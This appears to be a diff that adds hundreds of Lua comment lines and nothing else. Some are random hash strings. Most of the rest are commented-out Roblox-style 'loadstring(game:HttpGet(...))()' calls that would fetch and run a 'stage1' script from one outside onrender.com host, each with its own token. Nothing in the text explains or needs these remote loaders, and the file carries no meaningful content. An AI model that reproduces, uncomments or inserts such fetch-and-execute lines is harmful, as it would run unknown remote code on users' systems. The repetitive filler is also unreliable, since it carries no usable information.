+--[[ _9aa8c14f996f062ee572d00634bc047b ]]
+--[[ _c54cb96bfde41fad53d6444e68e6ab61 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3de9355f47637893", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3595685fcbf19f99", true))()
+--[[ _4d9740817a6626625d9a6f5be3227c58 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8659bc0119ff6743", true))()
+--[[ _9c5bb8dcd14f91484fa079456eca1c90 ]]
+--[[ _a44d8eee852a56cb1c55ee8f9f546348 ]]
+--[[ _585385094ba6876f4c3c3da15e9e0922 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a58310b23587b03d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aaa1de0a6834fdea", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d5c86fa5d4c1118f", true))()
+--[[ _665686f6eb04fe896f07e29d9718e8b8 ]]
+--[[ _527e90082bec5080b25bd2b84b884a54 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d460b02b717f1b8f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f027b7448e5d3e41", true))()
+--[[ _ebf2640b209898f33898a2d6ce664dd7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6970bd41debda28a", true))()
+--[[ _5de7c3c07b7bf774f6c2b5b8ad72b35f ]]
+--[[ _df485509ba585d18bc88fee7de563e70 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_be0466c12a4a6fc9", true))()
+--[[ _fb59d5434ab8432cee3834e4bc91b7b5 ]]
+--[[ _de001facc1dabf3142f7a2f1f05b16d9 ]]
+--[[ _d9cf8a9abcfdec9cb4081da3566987b8 ]]
+--[[ _7aa5bb03ed2c005374527f070cdac9cf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56b70ab2c12afc7f", true))()
+--[[ _811ab1d690c1bc5a6e64f43833af105d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ddb5a9eab9539edc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0e570482bd9f79c4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_110c838b607fa03d", true))()
+--[[ _93236f6c6cbb7b581849d879451d95ce ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4036ca1bcdbcb9d8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_394fad9c0fa4103d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c4925a79c341fe38", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3b3922ce5bbc672b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1e97e65decdb520f", true))()
+--[[ _d7f4bebdaf7a6aa8a3093b3d7afc30fe ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4704f7c93fde8481", true))()
+--[[ _88e57d594f98cac27efc14230e9fe8a3 ]]
+--[[ _2c0e5f94222473cbb0bc6a84edcd1d3d ]]
+--[[ _bd9fb3e9c12dfccd0bc80d1adc2d7d24 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_46daeb49e581ec48", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_295b72345f5e5c8e", true))()
+--[[ _6e08abbd3737c3c268581b246286328e ]]
+--[[ _c341a3c744ceafe8c9ff62ceef25dcf4 ]]
+--[[ _3f505c0de8346a4502eeadff375ae6b8 ]]
+--[[ _c18a06e9d5584438c1423c1df593ed03 ]]
+--[[ _798648f7708037f1d35f83fb016586de ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aaae9976ae2bfae3", true))()
+--[[ _cc6ec3b8fc72b2c027ba2a5bcccf5978 ]]
+--[[ _e3dd1b044a8ef16a0ab6311516f59302 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_152a1356c0070220", true))()
+--[[ _2207345dd33df3ddb6aaefe56229ec99 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_86effa82fc68ae42", true))()
+--[[ _d07d90bdca5d58a05ef949a75c454db4 ]]
+--[[ _2498e89ed35c79a24119898c2f829e08 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b12d865434aff4e", true))()
+--[[ _1641bb5e286cf0c48b3da5216660fd33 ]]
+--[[ _3e430d7967b52d052875d23d413806fc ]]
+--[[ _4be9b1ada7abadf46bf2d22d4e99ca62 ]]
+--[[ _fa287022c27ba6fa290daaee9b59dc6e ]]
+--[[ _c24cc20e18e6253fb53d3e1654ecdacb ]]
+--[[ _9f6a21f3ff71a8495cdcc6fbdbe6c2c0 ]]
+--[[ _1ea2e0a1cd47de459bea58e004393c47 ]]
+--[[ _191e092a67db3bfce00063f304efd131 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bfab91bf2865aa6d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ac41d5d5c3acc58", true))()
+--[[ _5eaa76a9610f866cd7d0b789749c14ff ]]
+--[[ _69a06476b21d812e471add0055ffeedc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41f81dd6dde864bf", true))()
+--[[ _273eb5e4ecae4c931bc9e51c486f4997 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_08e1e9a5d9448e3e", true))()
+--[[ _ff774d3ebe8ea02c2f2bf60a3dc00c62 ]]
+--[[ _d33f802b435d3cdce6f9439c93da16e5 ]]
+--[[ _546663e0f68b8d8417b527aeba06bffa ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ac8e037582244bc3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_98327abccff0d798", true))()
+--[[ _5263e824bdbe32af83787635a6cbf4d7 ]]
+--[[ _14008146173849baec903c4d568cc015 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_213c34c648efa765", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d073000e28647bd8", true))()
+--[[ _7294a1cb22a98277808643bcf619bb6d ]]
+--[[ _49633522219fbb152e485ecd14044bfb ]]
+--[[ _ab029fc719a8491c30fe89e53ea36a9b ]]
+--[[ _b6b414046f9edafb51c96fd5978c38f8 ]]
+--[[ _837ab68e38b7732aa1f24642ff3c2531 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5774a308e5a10cac", true))()
+--[[ _39ab3d82f8900e46a0d682f2ee1f6524 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3ff143f828c63353", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c01ded8e68db04c7", true))()
+--[[ _61afd36be1909926efd5c7ea1d2418a9 ]]
+--[[ _ba8e6d007bd1b5516f177bfecd24954b ]]
+--[[ _61f57ce4f995cf8d75c6bc8aa1458508 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5843df6090f1a84", true))()
+--[[ _eb370b05d3faff384516351435b488d5 ]]
+--[[ _a138f38a44ff7196ff0b093e9f54038b ]]
+--[[ _7acd48bf924a7f50245d7fc4dd34059e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1e760e35f1537fb0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1c9e178557c0c6c8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aa28bc5eb3d39414", true))()
+--[[ _6084ba942b996f437eb94f689869983c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_854dfaf21df5eeb4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0b9c93ed5e98fddd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0dda5a20c32a8333", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_140998b9f808b4fe", true))()
+--[[ _a1a098455b8446ed166a0202a23e4cb6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_564d8de9dfbf0a8d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_efc83ba2c54f98cf", true))()
+--[[ _badd064f413057bbd00113321f3f9112 ]]
+--[[ _f9637ea56185bf15479143bcbb1465ac ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_80653b0bfad34a0f", true))()
+--[[ _01408d022fe9653b2771d4a8b28d8941 ]]
+--[[ _9920dde10b57422a2dc683a5f71637c6 ]]
+--[[ _e5b5d17c2ad6e8f3510e19b7b92aec94 ]]
+--[[ _a015f45ca8881c1667c95a6ab7635197 ]]
+--[[ _421e48b553059bee2900fd34ceef700a ]]
+--[[ _be6723db746c1f1029c8a62f171092f5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89fe9a229d01eabc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_af2c91c7823694a9", true))()
+--[[ _cd905fed629b996b70fe8cb7a3d6e4b1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_349f3d5820bdf15f", true))()
+--[[ _f1facdb4b48443f9e6fddb0c113a0583 ]]
+--[[ _535260845708c4f999ff4ceac32c4f74 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1165936958ca34aa", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f0cfefedf0745fbb", true))()
+--[[ _5042927b2823f60d011877a1464fa1a1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5eb6f43192eace6", true))()
+--[[ _c6e37f695fc7d4738c0376ba36318983 ]]
+--[[ _79f7f75b9c5e56d7865e46b97cfcef8d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fc90bfe7e915aa15", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1f17c123947b027c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7c969dd4ce731852", true))()
+--[[ _b52a4984ca04b46016b0ff0369da56cd ]]
+--[[ _a21db285446c5426710f189e8e8db757 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a672ae0ec0b96431", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8adbd82da887a22f", true))()
+--[[ _46d44978e2323702f860dc0ce28a43b3 ]]
+--[[ _89bf901d19925b7dfb30b057cd8dd63d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_53b7e752609a470b", true))()
+--[[ _07f6b15e805b2ebd565c6ab5f72ee991 ]]
+--[[ _7edfb1501b807339de3bfaa7a13ffa8d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89cce7b8a3e1c76d", true))()
+--[[ _147050456afe2065ec0e2ed9c66e36b1 ]]
+--[[ _9c2e8ed9e590de0fc99f52655b0ce8ed ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7f8c077577fe75dd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b7116d1e8de93a75", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_54c3d030ebdaba25", true))()
+--[[ _535c6518b5938f1a061f97866a4c432b ]]
+--[[ _7d2057c602c28a63d9e969f06465901c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_43c8248791d5fb62", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9533dc504f3b9211", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3231ca0fb70cada6", true))()
+--[[ _0cdd1cdb02e8c0ee90f308a1a8036129 ]]
+--[[ _f808d9c237619c7257631484546c62a3 ]]
+--[[ _2a39815b0f61670827b28ad31a0bf89e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a091167b4a07422b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a9f336e3d7f7b38", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_905e81e6d41b6abc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a4e9d81a953dc819", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7c2d25d2f29e3947", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_58921e3b670e4450", true))()
+--[[ _f9b121b4d1956b509c0abd4eb79f8c3b ]]
+--[[ _86d67aaac7113a5259b1270a7939c7c7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0552eb15c922c35e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b69a083a0446f015", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_102daf457468e53e", true))()
+--[[ _d0faaff973946db9717f9b17215b8694 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bd58775c3280ee95", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_055b03bc621526ab", true))()
+--[[ _0b84c6a5df68538aedc1942b5061faf7 ]]
+--[[ _a39cc17c2354cbb85a65669dc0a3f6b9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bcc50b10e19d4ecd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_395d81526cbb3352", true))()
+--[[ _71af888cdf8ca0deb9abcca4ca4ce5dd ]]
+--[[ _7769d92edccaefd8c0790fe5a61e785a ]]
+--[[ _43efc4cb897181611ecc2ccc6825c76b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8c799588cd08f105", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d0176d6aa0dde32f", true))()
+--[[ _cedeb6b88d5961ae1c476f56354c04d2 ]]
+--[[ _a6ee785f7e46dcdbd79eb3ea44c0262d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a41d29133bab3a0e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_caafc31aab9519d2", true))()
+--[[ _393ef4cb5e4f43cfec8711df0240fa0f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8b294482db9abb56", true))()
+--[[ _d022f45858df10306ea1dfb9215df9cd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9de72080456bb2a", true))()
+--[[ _4bf67057d15c0adfa76ded8b6b44bdf3 ]]
+--[[ _7ed2d59625b2026dbe1b24b8a67373af ]]
+--[[ _71d8dc47766f3a6ad55c6177325b14e1 ]]
+--[[ _68552feed05094c1da98e1dc189142ee ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e7f9ccf42a1faf49", true))()
+--[[ _ae7003c88f409b2d84bf42a933795973 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d73be932c7dd6027", true))()
+--[[ _1f130f73c2c52c8b5d918d66fe4da008 ]]
+--[[ _79f7f9c997ea9a4e1b0bb77022956210 ]]
+--[[ _df8cfe0d767e9e968ec11041a0ef482d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c56582e7048a0e3b", true))()
+--[[ _6e6d91f18210136a42a6baf745a8f334 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4a5c4d6655cda86b", true))()
+--[[ _06fa031c31191957c807b4f5b1e89ee6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a8a0bab4b8864c4", true))()
+--[[ _f35095ebfcf0d39e0aabaf9c4e0b860a ]]
+--[[ _8d5b66878df72db7fcb2cb631aa729eb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9fbca4c2fdb26d87", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3748a73fcba227e9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c2ca7e0cfa7e17b3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c19505d3550586bb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41a8f2efa39d6d31", true))()
+--[[ _726f173dde9a4af2a9ffb6afdf3f5140 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0813baa874a3cac4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_932971b3ce9d57ff", true))()
+--[[ _e95e4b5f79881d0b9faa8ad85ea76375 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e0e23215237093f", true))()
+--[[ _1bae0671d4253884fbb6178a37196e3d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_92bf0d41b1208671", true))()
+--[[ _8d3ce280c0e8e4b6fa8fcf4e048fe0bc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a5cf6c0fd9317f17", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_40d637234680b63c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3639368c5bdcbae7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9bacbc9300358862", true))()
+--[[ _bf7d181893b0a999454f89b0dd29aea9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e94a068c71b854b9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2491866184c56ee3", true))()
+--[[ _40e3185b360e637534b26e804ea295aa ]]
+--[[ _3ef85bb984d2e73b7ed813d46de8d26a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5bc106e5267a5e98", true))()
+--[[ _58147aea6d9fd94fb15e2d964486c50b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a53052b8185551d2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d405d8875cf41875", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_29f09d4f33e9b707", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d83948f5eacec20", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f4b9968b8d4befbe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7aecd5ed18fe28b6", true))()
+--[[ _fc9f1a12e6e0eb82beb7de6a48144786 ]]
+--[[ _2a00bbb949d2bcd9da8ddd88f2858d3a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_adfc734411b90df2", true))()
+--[[ _02c4be9287eac8dd599059a9f547c558 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9832c83fdc4a4e46", true))()
+--[[ _d838f0a56c679bc0b70cd2dda49db3b9 ]]
+--[[ _b2b0e5fc006eaa97d5bc68061a44d8e0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b7e59ea4253852c2", true))()
+--[[ _ff1c39400e51228dffdb0deb0a2da554 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d0daeaf83a291fef", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_af762bebf2215dee", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cc50f68361e5263e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7f8ffb1e36cd202d", true))()
+--[[ _7bd24d3269fe1454aa418ab0405b5e09 ]]
+--[[ _4e48289a331219b0d0c18fa9fa7b5d7f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bbcd0527a6c81733", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_588dbf2d34e83a92", true))()
+--[[ _abbb8d3298afd8039c776d0387c55db2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4df8f961c284c7cb", true))()
+--[[ _d07a0060faae0242137ced092f367f79 ]]
+--[[ _581db367d10394a838bd58e0dc66cc67 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c0bcb13ad665b551", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a515ad54798553c2", true))()
+--[[ _f41b9009a3c1bc9629a813e4d6345778 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a900f9b5b294601b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1316d66681f11da0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_be4aac10ece9a6c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6c367db6a88a6d26", true))()
+--[[ _dc8a6b2949761aaf47e5f6071da7d216 ]]
+--[[ _bfde7bd9db79878d78e7234d1d565220 ]]
+--[[ _84de713ba3d5866430612739d3f26c51 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_97f77840362bf0c0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f1c5763beb8951db", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4ee6c21cade8ed5e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f31961213d7a6d07", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ef548d45db983221", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_80ddb7443f05df56", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f7f5165f2e6881d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4ef78b0fdf3b518b", true))()
+--[[ _0e12f070c58d884f64c2af0f87288012 ]]
+--[[ _1c819710ffbf62b662f9623618cf11fe ]]
+--[[ _0fe0fc8d80e55ee9126c4005eff8e1c1 ]]
+--[[ _f1a4f7f2b32dd986243c0cbc67779331 ]]
+--[[ _8642db6fc44a3e5a5febd88cddc37744 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_26d98444b9d0d2cd", true))()
+--[[ _e6066f6579341c97db0a5257a44ffe48 ]]
+--[[ _a05a6c12f9da107247fce5d0f767c541 ]]
+--[[ _02fc797ece980cbaa5f2c64df14ff54f ]]
+--[[ _3a971ff5bb07e039e78ad3cdc37da745 ]]
+--[[ _9bbcab3df325c959c9e10d9ff86a86af ]]
+--[[ _42c4d80d838d45f7123a967a188c1769 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8653e1e259b3bc10", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_091a2cb72b8adc16", true))()
+--[[ _41a838b2fe19292d4fd32f100107cc35 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_28a4a6f8c18b66ac", true))()
+--[[ _8b7fca9f5c2e00aedf81cff4098f54aa ]]
+--[[ _159a51299447523a80b008eea9df569c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_59298f4151ecdced", true))()
+--[[ _77b431c2aff0554ba4508a846e89002c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_68966b63d4e745d6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9d61b0cc86240d33", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42937b98eb9243f4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8cebee0d2487181", true))()
+--[[ _ced19720dd9b5c9b87fbd123e6ee3434 ]]
+--[[ _ab7307e7a0670eef68bc8692118c5a54 ]]
+--[[ _2b65305b35bc3af61edc595ab8ea7add ]]
+--[[ _02b02c404c3f285e4c9b8e353e207d65 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_07d311fb66b1440f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f24216cbd33c977", true))()
+--[[ _d9e65fd0b7eca0a29528ff7ef456a0f6 ]]
+--[[ _14c30a101a03f39ef9c9f7740f5bee93 ]]
+--[[ _233f062f31d0d5e120b364c9569720ab ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_456c8b24e95d7f15", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5d9636469291e965", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6431404875e388c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4ebaa5e4a97dbc9e", true))()
+--[[ _3a434203a5c6221f1e4589668993a40e ]]
+--[[ _65f3689289537b12cca770da3ae43d22 ]]
+--[[ _9df82a25be93fb62bfb1a4be8134a51b ]]
+--[[ _49af8778d47e3861987953eed3b352b1 ]]
+--[[ _36b71424a50e91541423cc357ffce3fe ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_22836077346a3995", true))()
+--[[ _ea4a82e1037ec818f5ac9c51a4c11e0e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_391072356ca11eea", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f169aa4118cc1a94", true))()
+--[[ _f9f57954484a78727936b562e621d037 ]]
+--[[ _556ebf0e14ae3c4b88cd975ecaff90af ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6f8536ba85cf9b2a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d607e3fee8825902", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9d3c02dd037e392e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c8ec8f052b428345", true))()
+--[[ _986dad751045ea50e9b0e858822a86ac ]]
+--[[ _1a51252a02866bd502ce9b3f9252c94a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6ee306f6a56d4f48", true))()
+--[[ _1dcce0cd4e5eb97e9fa8c6fb4f729161 ]]
+--[[ _96d4dee0cd221c4c9c9d27fc76fda56f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9d172705a4799594", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_175c07cb0a79e528", true))()
+--[[ _26005f5f4200f81d15029b59002a4cbd ]]
+--[[ _cdbe17a84877cacedec12cd197185365 ]]
+--[[ _cc85b1976dd85e2d001d55dda86ab06e ]]
+--[[ _53bf7ed1d297aa0da86eb7a71358881b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_378bc58d15438c88", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_19e767e3cb71a64b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b7bc317ab30776f3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7b778c8f3f69c1d7", true))()
+--[[ _3e3d3678986bcb1374e074efc580bdbd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf90b639a6105e09", true))()
+--[[ _c0c85211b411116f25567cb06b529b7e ]]
+--[[ _104be97c0de3916c4ef0f95cd368f34a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c62e45aabf0cf4ea", true))()
+--[[ _9d2f21b14b96ca8eeb7c900550ce27f9 ]]
+--[[ _8af45df08f1cf5cd0d8996b699357df0 ]]
+--[[ _9bbbe16bef73f965af2e90d349a9c6e0 ]]
+--[[ _5fd9163497d6f019b8df4dcaf85e1d20 ]]
+--[[ _aa195ac43e53aca622b20efb44143da0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_14d584ee72339779", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e691db921c8ad0aa", true))()
+--[[ _a51f4eeeb50fe5a1b3804ed59d70994c ]]
+--[[ _a4c4fc100a01e0756b6c6bbe686b7534 ]]
